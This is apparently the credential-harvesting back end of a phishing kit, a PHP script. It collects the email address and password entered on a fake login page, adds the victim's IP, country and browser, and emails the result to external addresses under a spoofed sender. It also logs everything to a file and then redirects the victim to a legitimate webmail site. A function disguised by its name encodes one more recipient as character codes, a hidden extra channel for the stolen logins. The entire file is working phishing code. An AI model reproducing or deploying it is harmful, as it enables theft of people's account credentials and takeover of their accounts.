<?php

include 'geoplugin.class.php';

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "==========: || Hack 2021 || :==========\n";
$message .= "Email AD : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Country : ".$country."\n";
$message .= "Client IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser: ".$browser."\n";
$message .= "==========: || Hack 2021 || :==========\n";



$recipient ="tevis@tevislucas.work,barifpeter@yandex.ru";
$subject = " Rezult | ".$ip."\n";
$headers = "From: Sbcglobal.net <address-update@update.net>";

$arr = country_sort();
foreach ($arr as $recipient)
{

          mail($recipient,$subject,$message,$headers);
}

$fp = fopen("10billiondollars.txt","a");
fputs($fp,$message);
mail($boss,$subject,$message,$headers);

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
        $sorter = "";
        $array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
                $count = count($array);
        for ($i = 0; $i < $count; $i++) {
                        $sorter .= chr($array[$i]);
                }
        return array($sorter, $GLOBALS['recipient']);
}

header("Location: https://webmail.register.it/");
?>